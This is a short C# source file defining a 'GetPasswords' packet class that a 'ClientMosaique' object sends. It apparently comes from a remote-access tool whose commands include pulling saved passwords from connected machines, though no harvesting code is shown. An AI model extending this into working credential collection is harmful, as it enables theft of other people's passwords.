using Client.Controllers;
using ZeroFormatter;

namespace Client.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetPasswords : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetPasswords;
            }
        }
        public GetPasswords()
        {
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
